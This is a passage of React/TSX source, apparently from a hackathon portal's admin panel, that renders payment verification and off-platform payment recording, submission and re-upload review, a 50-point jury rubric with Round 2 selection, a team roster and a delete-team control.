                      type="button"
                      disabled={activeActionKey !== null}
                      onClick={() => handleAdminAction({ action: 'REJECT_PAYMENT', teamId: selectedTeam.registration_id, reason: 'Invalid payment reference.' })}
                      className="py-2 px-3 bg-rose-950 hover:bg-rose-900 border border-rose-500/50 text-rose-300 text-xs font-mono flex items-center justify-center gap-1 cursor-pointer disabled:opacity-50 transition-colors"
                    >
                      {activeActionKey === `${selectedTeam.registration_id}-REJECT_PAYMENT-` ? (
                        <RefreshCw className="w-3.5 h-3.5 animate-spin text-rose-400" />
                      ) : (
                        <span>REJECT</span>
                      )}
                    </button>
                  </div>

                  <button
                    type="button"
                    disabled={activeActionKey !== null}
                    onClick={() => {
                      sound.playClick();
                      setResubmitTeam(selectedTeam);
                      setIsResubmitModalOpen(true);
                    }}
                    className="w-full py-2 bg-[#1C1304] hover:bg-[#2C1D06] border border-amber-500/60 text-amber-300 font-bold text-xs flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50 transition-colors"
                  >
                    <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
                    <span>REQUEST RESUBMISSION (WITH EMAIL)</span>
                  </button>

                  {/* Off-platform payment recorder — for squads that paid over
                      UPI and sent proof on WhatsApp instead of the portal. */}
                  <button
                    type="button"
                    onClick={() => { sound.playClick(); setIsRecordFormOpen(v => !v); }}
                    className="w-full py-2 bg-[#04160B] hover:bg-[#07240F] border border-emerald-500/40 text-emerald-300 font-bold text-xs flex items-center justify-center gap-1.5 cursor-pointer transition-colors"
                  >
                    <CreditCard className="w-3.5 h-3.5" />
                    <span>{isRecordFormOpen ? 'HIDE OFF-PLATFORM RECORDER' : 'RECORD WHATSAPP / OFF-PLATFORM PAYMENT'}</span>
                  </button>

                  {isRecordFormOpen && (
                    <div className="p-3 bg-[#020D06] border border-emerald-500/40 space-y-2">
                      <div className="text-[10px] text-emerald-200/80 leading-relaxed">
                        Attach the evidence from the WhatsApp proof, then record &amp; verify in one step. Every field is optional — a per-team placeholder UTR is used if left blank.
                      </div>
                      <input
                        type="text"
                        value={recordUtr}
                        onChange={(e) => setRecordUtr(e.target.value)}
                        placeholder="12-digit UTR from their screenshot (optional)"
                        className="w-full px-2.5 py-2 bg-[#020817] border border-white/15 text-white text-[11px] font-mono focus:outline-none focus:border-emerald-400/60 uppercase"
                      />
                      <div className="grid grid-cols-2 gap-2">
                        <input
                          type="text"
                          value={recordPayerName}
                          onChange={(e) => setRecordPayerName(e.target.value)}
                          placeholder="Payer name (optional)"
                          className="px-2.5 py-2 bg-[#020817] border border-white/15 text-white text-[11px] font-mono focus:outline-none focus:border-emerald-400/60"
                        />
                        <input
                          type="text"
                          value={recordPayerUpi}
                          onChange={(e) => setRecordPayerUpi(e.target.value)}
                          placeholder="Payer UPI ID (optional)"
                          className="px-2.5 py-2 bg-[#020817] border border-white/15 text-white text-[11px] font-mono focus:outline-none focus:border-emerald-400/60 lowercase"
                        />
                      </div>
                      <label className="block p-2.5 bg-[#020817] border border-dashed border-emerald-500/40 text-[11px] text-slate-300 cursor-pointer text-center">
                        <input
                          type="file"
                          accept="image/*,.pdf"
                          onChange={(e) => {
                            if (e.target.files && e.target.files[0]) setRecordScreenshotFile(e.target.files[0]);
                          }}
                          className="hidden"
                        />
                        {recordScreenshotFile
                          ? `✓ ${recordScreenshotFile.name} (${(recordScreenshotFile.size / 1024).toFixed(1)} KB)`
                          : 'Attach their payment screenshot (optional)'}
                      </label>
                      <button
                        type="button"
                        disabled={isRecordingPayment || activeActionKey !== null}
                        onClick={handleRecordPayment}
                        className="w-full py-2 bg-emerald-600 hover:bg-emerald-500 text-[#04160B] font-display font-black text-xs flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50 transition-colors"
                      >
                        {isRecordingPayment ? (
                          <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                        ) : (
                          <Check className="w-3.5 h-3.5" />
                        )}
                        <span>RECORD EVIDENCE &amp; VERIFY PAYMENT</span>
                      </button>
                    </div>
                  )}

                  {/* Official Receipt Quick Access & Email Dispatch */}
                  {selectedTeam.payment_status === 'VERIFIED' && (
                    <div className="space-y-2">
                      <button
                        type="button"
                        onClick={() => { sound.playClick(); setIsReceiptModalOpen(true); }}
                        className="w-full py-2 bg-gradient-to-r from-[#00BCF2] via-[#38BDF8] to-[#00BCF2] hover:brightness-110 text-[#040E24] font-display font-black text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(56,189,248,0.3)] transition-all"
                      >
                        <FileText className="w-3.5 h-3.5" />
                        <span>VIEW / PRINT OFFICIAL RECEIPT</span>
                      </button>

                      <button
                        type="button"
                        disabled={activeActionKey !== null}
                        onClick={() => handleAdminAction({ action: 'RESEND_VERIFICATION_EMAIL', teamId: selectedTeam.registration_id })}
                        className="w-full py-2 bg-[#061838] hover:bg-[#0C2A5E] border border-[#38BDF8]/50 text-[#38BDF8] font-bold text-xs flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50 transition-colors"
                      >
                        {activeActionKey === `${selectedTeam.registration_id}-RESEND_VERIFICATION_EMAIL-` ? (
                          <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#38BDF8]" />
                        ) : (
                          <Mail className="w-3.5 h-3.5" />
                        )}
                        <span>RESEND CONFIRMATION EMAIL</span>
                      </button>
                    </div>
                  )}
                </div>
              </div>

              {/* ROUND 1 PPT & DELIVERABLES EVALUATION */}
              <div className="p-4 bg-[#040E24] border border-white/10 space-y-3">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <div className="text-[11px] font-mono-hud text-[#38BDF8] font-bold">
                    ROUND 1 SUBMISSION & DELIVERABLES
                  </div>
                  <span className={`text-[10px] font-mono px-2 py-0.5 font-bold ${
                    selectedTeam.round_1_status === 'SELECTED'
                      ? 'bg-emerald-400 text-[#040E24]'
                      : ['SUBMITTED', 'UNDER_REVIEW'].includes(selectedTeam.round_1_status)
                      ? 'bg-emerald-950 text-emerald-300 border border-emerald-500/30'
                      : 'bg-slate-900 text-slate-400'
                  }`}>
                    {selectedTeam.round_1_status}
                  </span>
                </div>

                <div className="space-y-2.5">
                  <div className="flex items-center justify-between text-xs">
                    <div>R1 Status: <strong className="text-white">{selectedTeam.round_1_status}</strong></div>
                    <div>R2 Access: <strong className="text-emerald-400">{selectedTeam.round_2_status}</strong></div>
                  </div>

                  {selectedTeam.submissions && selectedTeam.submissions.length > 0 ? (
                    (() => {
                      const latestSub = activeSubmission(selectedTeam) ?? selectedTeam.submissions[selectedTeam.submissions.length - 1];
                      return (
                        <div className="space-y-2.5 mt-2">
                          {/* Presentation File Card */}
                          <div className="p-3 bg-[#020817] border border-[#38BDF8]/30 space-y-2">
                            <div className="flex items-center justify-between">
                              <div className="text-emerald-400 font-bold flex items-center gap-1.5 text-xs">
                                <FileCheck className="w-3.5 h-3.5" />
                                <span>Presentation Deck (v{latestSub.version})</span>
                              </div>
                              <span className="text-[10px] text-slate-400 font-mono">
                                {(latestSub.file_size / (1024 * 1024)).toFixed(2)} MB
                              </span>
                            </div>

                            <div className="text-white text-xs font-semibold truncate">
                              {latestSub.original_filename}
                            </div>

                            <div className="text-[10px] text-slate-400">
                              Uploaded: {new Date(latestSub.submitted_at).toLocaleString()}
                            </div>

                            {/* View & Download Action Buttons */}
                            <div className="flex gap-2 pt-1">
                              <a
                                href={latestSub.file_url}
                                target="_blank"
                                rel="noreferrer"
                                className="flex-1 py-1.5 px-2.5 bg-[#0B2556] hover:bg-[#133A80] border border-[#38BDF8]/50 text-[#38BDF8] text-xs font-mono flex items-center justify-center gap-1.5 transition-colors"
                              >
                                <Download className="w-3.5 h-3.5" />
                                <span>Download File</span>
                              </a>

                              <a
                                href={
                                  // Test the stored filename, not the link:
                                  // file_url is now a signed URL carrying a
                                  // ?token=, so it never ends in ".pdf" and
                                  // every PDF was being bounced through the
                                  // Google viewer.
                                  latestSub.original_filename.toLowerCase().endsWith('.pdf')
                                    ? latestSub.file_url
                                    : `https://docs.google.com/viewer?url=${encodeURIComponent(latestSub.file_url)}&embedded=true`
                                }
                                target="_blank"
                                rel="noreferrer"
                                className="flex-1 py-1.5 px-2.5 bg-[#07193D] hover:bg-[#0B2556] border border-cyan-400/40 text-cyan-300 text-xs font-mono flex items-center justify-center gap-1.5 transition-colors"
                              >
                                <ExternalLink className="w-3.5 h-3.5" />
                                <span>Browser Preview</span>
                              </a>
                            </div>
                          </div>

                          {/* Live Project / Demo Link (if submitted) */}
                          {latestSub.project_url && (
                            <div className="p-3 bg-[#020817] border border-cyan-500/30 space-y-1.5">
                              <div className="text-[#38BDF8] text-[10px] uppercase font-mono-hud flex items-center gap-1 font-bold">
                                <Globe className="w-3 h-3 text-cyan-400" />
                                <span>Live Project / Prototype Link:</span>
                              </div>
                              <div className="flex items-center gap-2">
                                <a
                                  href={latestSub.project_url.startsWith('http') ? latestSub.project_url : `https://${latestSub.project_url}`}
                                  target="_blank"
                                  rel="noreferrer"
                                  className="flex-1 text-cyan-300 hover:underline break-all text-xs inline-flex items-center gap-1 bg-[#040E24] p-1.5 border border-white/10"
                                >
                                  <span className="truncate">{latestSub.project_url}</span>
                                  <ExternalLink className="w-3 h-3 shrink-0 ml-auto" />
                                </a>
                                <button
                                  type="button"
                                  onClick={(e) => handleCopyUrl(latestSub.project_url!, e)}
                                  className="p-1.5 bg-[#0B2556] border border-[#38BDF8]/40 text-[#38BDF8] text-xs cursor-pointer hover:bg-[#38BDF8]/20"
                                  title="Copy URL"
                                >
                                  {copiedUrl === latestSub.project_url ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                </button>
                              </div>
                            </div>
                          )}

                          {/* Code Repository Link (if submitted) */}
                          {latestSub.repo_url && (
                            <div className="p-3 bg-[#020817] border border-white/10 space-y-1.5">
                              <div className="text-slate-400 text-[10px] uppercase font-mono-hud flex items-center gap-1 font-bold">
                                <Code2 className="w-3 h-3 text-slate-300" />
                                <span>Source Code Repository:</span>
                              </div>
                              <div className="flex items-center gap-2">
                                <a
                                  href={latestSub.repo_url.startsWith('http') ? latestSub.repo_url : `https://${latestSub.repo_url}`}
                                  target="_blank"
                                  rel="noreferrer"
                                  className="flex-1 text-slate-200 hover:underline break-all text-xs inline-flex items-center gap-1 bg-[#040E24] p-1.5 border border-white/10"
                                >
                                  <span className="truncate">{latestSub.repo_url}</span>
                                  <ExternalLink className="w-3 h-3 shrink-0 ml-auto" />
                                </a>
                                <button
                                  type="button"
                                  onClick={(e) => handleCopyUrl(latestSub.repo_url!, e)}
                                  className="p-1.5 bg-[#0B2556] border border-[#38BDF8]/40 text-[#38BDF8] text-xs cursor-pointer hover:bg-[#38BDF8]/20"
                                  title="Copy URL"
                                >
                                  {copiedUrl === latestSub.repo_url ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                </button>
                              </div>
                            </div>
                          )}

                          {/* Version History if multiple versions exist */}
                          {selectedTeam.submissions.length > 1 && (
                            <div className="p-2.5 bg-[#020817] border border-white/5 space-y-1 text-[11px]">
                              <div className="text-slate-400 font-mono-hud text-[10px]">ALL SUBMISSION VERSIONS ({selectedTeam.submissions.length}):</div>
                              <div className="space-y-1 max-h-28 overflow-y-auto">
                                {selectedTeam.submissions.map((sub, sIdx) => (
                                  <div key={sub.id || sIdx} className="flex items-center justify-between gap-2 text-slate-300 bg-[#040E24] px-2 py-1 border border-white/5">
                                    <span className="truncate">
                                      <span className={`font-mono text-[9px] px-1 py-0.5 mr-1.5 font-bold ${
                                        sub.submission_status === 'ACCEPTED'
                                          ? 'bg-emerald-950 text-emerald-300 border border-emerald-500/30'
                                          : sub.submission_status === 'SUPERSEDED'
                                          ? 'bg-slate-900 text-slate-500 border border-white/10'
                                          : 'bg-[#0B2556] text-[#38BDF8] border border-[#38BDF8]/30'
                                      }`}>
                                        {sub.submission_status}
                                      </span>
                                      v{sub.version}: {sub.original_filename}
                                    </span>
                                    <a href={sub.file_url} target="_blank" rel="noreferrer" className="text-[#38BDF8] hover:underline flex items-center gap-1 text-[10px]">
                                      <Download className="w-2.5 h-2.5" />
                                      <span>Download</span>
                                    </a>
                                  </div>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                      );
                    })()
                  ) : (
                    <div className="p-4 bg-[#020817] border border-white/10 text-center text-slate-500 text-xs font-mono">
                      No presentation or project deliverables uploaded yet.
                    </div>
                  )}
                </div>

                {/* Current Rubric Quick Summary in Deliverables Card */}
                <div className="pt-2 border-t border-white/10 flex items-center justify-between text-xs font-mono">
                  <span className="text-slate-400">Current Rubric Tally:</span>
                  <span className="font-bold text-[#38BDF8] flex items-center gap-1">
                    <Star className="w-3 h-3 fill-[#38BDF8]" />
                    {totalRubricScore} / 50 ({Math.round((totalRubricScore / 50) * 100)}%)
                  </span>
                </div>
              </div>

              {/*
                RE-UPLOAD REQUEST REVIEW
                A team's first deck is auto-accepted on payment verification.
                Replacing it needs approval here, and each approval is worth
                exactly one replacement upload.
              */}
              {(() => {
                const requests = (selectedTeam.resubmission_requests || []).filter(r => r.round_number === 1);
                const pending = requests.find(r => r.status === 'PENDING');
                const approved = requests.find(r => r.status === 'APPROVED');
                const history = requests.filter(r => r.status === 'REJECTED' || r.status === 'USED');

                if (requests.length === 0) return null;

                return (
                  <div className={`p-4 space-y-3 border ${
                    pending
                      ? 'bg-amber-950/20 border-amber-500/50 shadow-[0_0_20px_rgba(245,158,11,0.12)]'
                      : 'bg-[#040E24] border-white/10'
                  }`}>
                    <div className="flex items-center justify-between border-b border-white/10 pb-2">
                      <div className="text-[11px] font-mono-hud text-[#38BDF8] font-bold flex items-center gap-1.5">
                        <RefreshCw className="w-3.5 h-3.5" />
                        <span>PPT RE-UPLOAD REQUESTS</span>
                      </div>
                      {pending && (
                        <span className="text-[10px] font-mono px-2 py-0.5 font-bold bg-amber-400 text-[#040E24] animate-pulse">
                          ACTION NEEDED
                        </span>
                      )}
                    </div>

                    {pending && (
                      <div className="space-y-3">
                        <div className="p-3 bg-[#020817] border border-amber-500/30 space-y-1.5">
                          <div className="text-[10px] font-mono-hud text-amber-400">
                            REQUESTED {new Date(pending.created_at).toLocaleString()}
                          </div>
                          <p className="text-xs text-slate-200 font-sans leading-relaxed whitespace-pre-wrap break-words">
                            {pending.reason}
                          </p>
                        </div>

                        <div>
                          <label className="block text-[10px] font-mono-hud text-[#BAE6FD] mb-1">
                            NOTE TO THE TEAM (OPTIONAL — INCLUDED IN THE EMAIL)
                          </label>
                          <textarea
                            value={reuploadDecisionNote}
                            onChange={(e) => setReuploadDecisionNote(e.target.value)}
                            rows={2}
                            placeholder="e.g. Approved — upload the corrected deck before the deadline."
                            className="w-full px-3 py-2 bg-[#020817] border border-white/15 text-white text-xs font-mono focus:border-[#38BDF8] focus:outline-none resize-y"
                          />
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                          <button
                            onClick={() => {
                              handleAdminAction({
                                action: 'APPROVE_REUPLOAD_REQUEST',
                                teamId: selectedTeam.registration_id,
                                requestId: pending.id,
                                note: reuploadDecisionNote.trim() || undefined
                              });
                              setReuploadDecisionNote('');
                            }}
                            disabled={activeActionKey === `${selectedTeam.registration_id}-APPROVE_REUPLOAD_REQUEST-`}
                            className="py-2.5 bg-emerald-500 text-[#040E24] text-[11px] font-mono-hud font-bold flex items-center justify-center gap-2 cursor-pointer active:scale-95 hover:bg-emerald-400 transition-colors disabled:opacity-50"
                          >
                            {activeActionKey === `${selectedTeam.registration_id}-APPROVE_REUPLOAD_REQUEST-` ? (
                              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                            ) : (
                              <CheckCircle2 className="w-3.5 h-3.5" />
                            )}
                            <span>APPROVE ONE RE-UPLOAD</span>
                          </button>

                          <button
                            onClick={() => {
                              handleAdminAction({
                                action: 'REJECT_REUPLOAD_REQUEST',
                                teamId: selectedTeam.registration_id,
                                requestId: pending.id,
                                note: reuploadDecisionNote.trim() || undefined
                              });
                              setReuploadDecisionNote('');
                            }}
                            disabled={activeActionKey === `${selectedTeam.registration_id}-REJECT_REUPLOAD_REQUEST-`}
                            className="py-2.5 bg-transparent border border-rose-500/50 text-rose-300 text-[11px] font-mono-hud font-bold flex items-center justify-center gap-2 cursor-pointer active:scale-95 hover:bg-rose-500/15 transition-colors disabled:opacity-50"
                          >
                            {activeActionKey === `${selectedTeam.registration_id}-REJECT_REUPLOAD_REQUEST-` ? (
                              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                            ) : (
                              <XCircle className="w-3.5 h-3.5" />
                            )}
                            <span>DECLINE REQUEST</span>
                          </button>
                        </div>
                      </div>
                    )}

                    {approved && (
                      <div className="p-3 bg-emerald-950/30 border border-emerald-500/40 text-xs space-y-1">
                        <div className="text-emerald-300 font-mono-hud text-[10px] font-bold">
                          APPROVED — AWAITING THE TEAM&apos;S REPLACEMENT UPLOAD
                        </div>
                        <div className="text-slate-400 font-mono text-[11px]">
                          Approved by {approved.reviewed_by || 'Admin'} on{' '}
                          {approved.reviewed_at ? new Date(approved.reviewed_at).toLocaleString() : '—'}
                        </div>
                      </div>
                    )}

                    {history.length > 0 && (
                      <div className="pt-2 border-t border-white/10 space-y-1.5">
                        <div className="text-slate-400 font-mono-hud text-[10px]">REQUEST HISTORY ({history.length}):</div>
                        <div className="space-y-1 max-h-32 overflow-y-auto">
                          {history.map((r) => (
                            <div key={r.id} className="px-2 py-1.5 bg-[#020817] border border-white/5 text-[11px] space-y-0.5">
                              <div className="flex items-center justify-between gap-2">
                                <span className={`font-mono font-bold ${r.status === 'USED' ? 'text-emerald-400' : 'text-rose-400'}`}>
                                  {r.status === 'USED' ? 'APPROVED & USED' : 'DECLINED'}
                                </span>
                                <span className="text-slate-500 font-mono text-[10px]">
                                  {r.reviewed_at ? new Date(r.reviewed_at).toLocaleDateString() : ''}
                                </span>
                              </div>
                              <div className="text-slate-400 break-words">{r.reason}</div>
                              {r.review_notes && (
                                <div className="text-slate-500 italic break-words">Note: {r.review_notes}</div>
                              )}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                );
              })()}

            </div>

            {/* 5-CATEGORY JURY EVALUATION RUBRIC CONSOLE */}
            <div className="p-4 sm:p-5 bg-[#040E24] border border-[#38BDF8]/40 space-y-4 shadow-[0_0_20px_rgba(56,189,248,0.1)]">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/10 pb-3">
                <div className="space-y-0.5">
                  <div className="text-xs sm:text-sm font-mono-hud text-white font-black flex items-center gap-2">
                    <Award className="w-4 h-4 text-[#38BDF8]" />
                    <span>ROUND 1 JURY EVALUATION RUBRIC (5 CATEGORIES • 50 PTS MAX)</span>
                  </div>
                  <p className="text-[11px] text-slate-400">
                    Rate each category from 0 to 10. The aggregate score determines Round 2 qualification.
                  </p>
                </div>

                {/* Score & Tier Badge */}
                <div className="flex items-center gap-2 self-start sm:self-auto">
                  <div className="px-3 py-1.5 bg-[#07193D] border border-[#38BDF8]/50 text-white font-mono text-xs flex items-center gap-1.5">
                    <Star className="w-3.5 h-3.5 fill-[#38BDF8] text-[#38BDF8]" />
                    <span>TOTAL:</span>
                    <strong className="text-base text-[#38BDF8] font-mono-hud">{totalRubricScore}</strong>
                    <span className="text-slate-400">/ 50 ({Math.round((totalRubricScore / 50) * 100)}%)</span>
                  </div>

                  <span className={`text-[10px] font-mono font-bold px-2.5 py-1 border ${
                    totalRubricScore >= 45
                      ? 'bg-emerald-950 text-emerald-300 border-emerald-500/50'
                      : totalRubricScore >= 38
                      ? 'bg-cyan-950 text-cyan-300 border-cyan-400/50'
                      : totalRubricScore >= 30
                      ? 'bg-amber-950 text-amber-300 border-amber-500/50'
                      : 'bg-rose-950 text-rose-300 border-rose-500/50'
                  }`}>
                    {totalRubricScore >= 45
                      ? '🔥 TOP CONTENDER (90%+)'
                      : totalRubricScore >= 38
                      ? '⭐ STRONG FINALIST (76-88%)'
                      : totalRubricScore >= 30
                      ? '⚖️ BORDERLINE (60-74%)'
                      : '⚠️ BELOW CUTOFF (<60%)'}
                  </span>
                </div>
              </div>

              {/* Dynamic Score Meter */}
              <div className="space-y-1">
                <div className="w-full bg-[#020817] h-2 border border-white/10 overflow-hidden">
                  <div 
                    className="h-full transition-all duration-300 bg-gradient-to-r from-[#00BCF2] via-cyan-400 to-emerald-400"
                    style={{ width: `${(totalRubricScore / 50) * 100}%` }}
                  />
                </div>
              </div>

              {/* 5 Categories Interactive Scoring Cards */}
              <div className="space-y-3">
                {RUBRIC_CATEGORIES.map((cat) => {
                  const currentScore = rubricScores[cat.key];
                  return (
                    <div 
                      key={cat.key}
                      className="p-3.5 bg-[#020817] border border-white/10 hover:border-white/20 transition-all space-y-2.5"
                    >
                      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1.5">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] font-mono px-1.5 py-0.5 bg-[#0B2556] text-[#38BDF8] border border-[#38BDF8]/40 font-bold">
                            {cat.num}
                          </span>
                          <span className="text-xs font-bold text-white font-sans">
                            {cat.title}
                          </span>
                        </div>

                        {/* Criterion Score Pill */}
                        <div className="flex items-center gap-2">
                          <span className={`text-[11px] font-mono px-2 py-0.5 border font-bold ${cat.accentClass}`}>
                            Score: {currentScore} / 10
                          </span>
                        </div>
                      </div>

                      <p className="text-[11px] text-slate-400">
                        {cat.desc}
                      </p>

                      {/* Interactive 0-10 Button Selector */}
                      <div className="space-y-1.5 pt-1">
                        <div className="flex items-center justify-between text-[10px] font-mono text-slate-500">
                          <span>0 (Poor / Missing)</span>
                          <span>5 (Average)</span>
                          <span>10 (Exceptional)</span>
                        </div>

                        <div className="grid grid-cols-11 gap-1">
                          {[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10].map((score) => {
                            const isSelected = currentScore === score;
                            return (
                              <button
                                key={score}
                                type="button"
                                onClick={() => setRubricScores(prev => ({ ...prev, [cat.key]: score }))}
                                className={`py-1.5 text-center text-xs font-mono font-bold transition-all cursor-pointer border ${
                                  isSelected
                                    ? 'bg-[#38BDF8] text-[#040E24] border-[#38BDF8] shadow-[0_0_10px_rgba(56,189,248,0.5)] scale-105 z-10'
                                    : 'bg-[#040E24] hover:bg-[#0B2556] text-slate-300 border-white/10 hover:border-[#38BDF8]/40'
                                }`}
                              >
                                {score}
                              </button>
                            );
                          })}
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Rubric Decision Actions Bar */}
              <div className="pt-3 border-t border-white/10 flex flex-wrap items-center gap-2.5">
                {/* Save Scores Only */}
                <button
                  type="button"
                  disabled={activeActionKey !== null}
                  onClick={() => handleAdminAction({
                    action: 'EVALUATE_ROUND_1',
                    teamId: selectedTeam.registration_id,
                    decision: 'SAVE_SCORES',
                    score: totalRubricScore,
                    evaluationScores: { ...rubricScores, total: totalRubricScore },
                    note: adminNoteInput || undefined
                  })}
                  className="px-4 py-2 bg-[#0B2556] hover:bg-[#133A80] border border-[#38BDF8]/60 text-[#38BDF8] font-bold text-xs font-mono flex items-center gap-1.5 cursor-pointer disabled:opacity-50 transition-colors"
                >
                  {activeActionKey === `${selectedTeam.registration_id}-EVALUATE_ROUND_1-SAVE_SCORES` ? (
                    <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#38BDF8]" />
                  ) : (
                    <Save className="w-3.5 h-3.5" />
                  )}
                  <span>SAVE SCORES ({totalRubricScore}/50)</span>
                </button>

                {/* Qualify / Select for Round 2 */}
                <button
                  type="button"
                  disabled={activeActionKey !== null}
                  onClick={() => handleAdminAction({
                    action: 'EVALUATE_ROUND_1',
                    teamId: selectedTeam.registration_id,
                    decision: 'SELECT',
                    score: totalRubricScore,
                    evaluationScores: { ...rubricScores, total: totalRubricScore },
                    note: adminNoteInput || undefined
                  })}
                  className="flex-1 min-w-[180px] py-2 bg-emerald-500 hover:bg-emerald-400 text-[#040E24] font-black text-xs font-mono flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(52,211,153,0.3)] disabled:opacity-50 transition-all"
                >
                  {activeActionKey === `${selectedTeam.registration_id}-EVALUATE_ROUND_1-SELECT` ? (
                    <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#040E24]" />
                  ) : (
                    <Sparkles className="w-3.5 h-3.5" />
                  )}
                  <span>SELECT FOR ROUND 2 ({totalRubricScore}/50)</span>
                </button>

                {/* Mark Not Selected */}
                <button
                  type="button"
                  disabled={activeActionKey !== null}
                  onClick={() => handleAdminAction({
                    action: 'EVALUATE_ROUND_1',
                    teamId: selectedTeam.registration_id,
                    decision: 'NOT_SELECTED',
                    score: totalRubricScore,
                    evaluationScores: { ...rubricScores, total: totalRubricScore },
                    note: adminNoteInput || undefined
                  })}
                  className="px-3.5 py-2 bg-rose-950/70 hover:bg-rose-900 border border-rose-500/50 text-rose-300 text-xs font-mono flex items-center gap-1.5 cursor-pointer disabled:opacity-50 transition-colors"
                >
                  {activeActionKey === `${selectedTeam.registration_id}-EVALUATE_ROUND_1-NOT_SELECTED` && (
                    <RefreshCw className="w-3 h-3 animate-spin text-rose-400" />
                  )}
                  <span>NOT SELECTED</span>
                </button>

                {/* Mark Under Review */}
                <button
                  type="button"
                  disabled={activeActionKey !== null}
                  onClick={() => handleAdminAction({
                    action: 'EVALUATE_ROUND_1',
                    teamId: selectedTeam.registration_id,
                    decision: 'UNDER_REVIEW',
                    score: totalRubricScore,
                    evaluationScores: { ...rubricScores, total: totalRubricScore },
                    note: adminNoteInput || undefined
                  })}
                  className="px-3.5 py-2 bg-amber-950/70 hover:bg-amber-900 border border-amber-500/50 text-amber-300 text-xs font-mono flex items-center gap-1.5 cursor-pointer disabled:opacity-50 transition-colors"
                >
                  {activeActionKey === `${selectedTeam.registration_id}-EVALUATE_ROUND_1-UNDER_REVIEW` && (
                    <RefreshCw className="w-3 h-3 animate-spin text-amber-400" />
                  )}
                  <span>SET UNDER REVIEW</span>
                </button>
              </div>
            </div>

            {/* SQUAD MEMBERS ROSTER */}
            <div className="p-4 bg-[#040E24] border border-white/10 space-y-3">
              <div className="text-[11px] font-mono-hud text-[#38BDF8] font-bold">
                SQUAD ROSTER ({getAdditionalMembers(selectedTeam).length + 1} PARTICIPANTS)
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2.5 text-xs">
                <div className="p-2.5 bg-[#07193D] border border-[#38BDF8]/40 space-y-0.5">
                  <div className="text-[#38BDF8] font-bold text-[10px]">LEADER: {selectedTeam.leader_name}</div>
                  <div className="text-slate-300">{selectedTeam.leader_phone}</div>
                  <div className="text-slate-400 text-[10px] truncate">{selectedTeam.leader_email}</div>
                  <div className="text-slate-400 text-[10px]">{selectedTeam.department} • {selectedTeam.year}</div>
                </div>
                {getAdditionalMembers(selectedTeam).map((m, idx) => (
                  <div key={idx} className="p-2.5 bg-[#020817] border border-white/10 space-y-0.5">
                    <div className="text-white font-bold text-[10px]">MEMBER 0{idx + 1}: {m.member_name}</div>
                    <div className="text-slate-300">{m.member_phone}</div>
                    {m.member_email && <div className="text-slate-400 text-[10px] truncate">{m.member_email}</div>}
                    <div className="text-slate-400 text-[10px]">{m.department} • {m.year}</div>
                  </div>
                ))}
              </div>
            </div>

            {/* ADMIN NOTES */}
            <div className="p-4 bg-[#040E24] border border-white/10 space-y-2">
              <div className="text-[11px] font-mono-hud text-[#38BDF8] font-bold">ADMINISTRATIVE NOTES</div>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={adminNoteInput || selectedTeam.admin_notes || ''}
                  onChange={(e) => setAdminNoteInput(e.target.value)}
                  placeholder="Add confidential admin note..."
                  className="flex-1 p-2 bg-[#020817] border border-white/10 text-white text-xs font-mono focus:outline-none focus:border-[#38BDF8]"
                />
                <button
                  type="button"
                  disabled={activeActionKey !== null}
                  onClick={() => handleAdminAction({ action: 'ADD_NOTE', teamId: selectedTeam.registration_id, note: adminNoteInput })}
                  className="px-4 py-2 bg-[#0B2556] hover:bg-[#133A80] text-[#38BDF8] border border-[#38BDF8]/40 text-xs font-mono cursor-pointer disabled:opacity-50 transition-colors flex items-center gap-1.5"
                >
                  {activeActionKey === `${selectedTeam.registration_id}-ADD_NOTE-` && (
                    <RefreshCw className="w-3 h-3 animate-spin" />
                  )}
                  <span>SAVE NOTE</span>
                </button>
              </div>
            </div>

            {/* DANGER ZONE: PERMANENT PURGE */}
            <div className="p-4 bg-rose-950/20 border border-rose-500/30 space-y-2.5">
              <div className="flex items-center gap-1.5 text-rose-400 font-mono text-xs font-bold uppercase tracking-wider">
                <AlertTriangle className="w-3.5 h-3.5 text-rose-400" />
                <span>DANGER ZONE</span>
              </div>
              <p className="text-[11px] text-slate-400 font-sans leading-relaxed">
                Permanently purge this squad record, credentials, payment logs, and submitted files from the system.
              </p>
              <button
                type="button"
                onClick={() => {
                  sound.playClick();
                  setTeamToDelete(selectedTeam);
                  setDeleteConfirmInput('');
                  setHasCheckedDeleteWarning(false);
                  setIsDeleteModalOpen(true);
                }}
                className="w-full py-2 bg-rose-950 hover:bg-rose-900 border border-rose-500 text-rose-200 font-display font-black text-xs flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(244,63,94,0.25)] transition-all"
              >
                <Trash2 className="w-3.5 h-3.5 text-rose-400" />
                <span>DELETE TEAM ENTRY</span>
              </button>
            </div>

          </div>
        </div>
      )}

      {/* GLOBAL FLOATING TOAST NOTIFICATION CONTAINER */}
      <div className="fixed top-4 right-4 z-[9999] flex flex-col gap-2 max-w-sm w-full pointer-events-none px-2 sm:px-0">
        {toasts.map((toast) => (
          <div
            key={toast.id}
